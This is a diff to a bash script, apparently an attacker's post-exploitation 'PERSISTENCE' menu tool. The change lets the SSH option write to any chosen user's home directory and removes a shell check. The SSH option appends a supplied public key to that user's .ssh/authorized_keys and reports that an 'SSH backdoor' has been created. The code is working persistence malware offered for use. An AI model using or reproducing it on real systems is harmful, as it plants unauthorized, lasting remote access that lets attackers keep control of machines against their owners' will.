@@ -1,9 +1,6 @@
 #!/bin/bash
 trap 'echo -e "\nUSER INTERRUPTED! EXITING..."; exit 1' SIGINT
-if [[ $SHELL != "/bin/bash" ]]; then
-  echo -e "\nRun this script in bash shell..."
-  exit 1
-fi
+
 while true; do
   cat <<EOF
 [+] PERSISTENCE [+]
@@ -53,13 +50,17 @@ EOF
     ;;
   3)
     read -r -p "Set your ssh public key: " ssh_pub
-    if [[ -z $ssh_pub ]]; then
-      echo "[-]SSH key can not be empty..."
+    read -r -p "Set your home dir: " home_dir
+    if [[ -z $ssh_pub || -z $home_dir ]]; then
+      echo "[-]SSH key and home dir can not be empty..."
       read -r
       continue
     fi
-    mkdir -p "$HOME/.ssh"
-    if echo "$ssh_pub" >>"$HOME/.ssh/authorized_keys"; then
+    if [[ $home_dir != */ ]]; then
+      home_dir="$home_dir/"
+    fi
+    mkdir -p "$home_dir.ssh"
+    if echo "$ssh_pub" >>"$home_dir.ssh/authorized_keys"; then
       echo "[+]SSH backdoor has successfully created..."
       read -r
     else
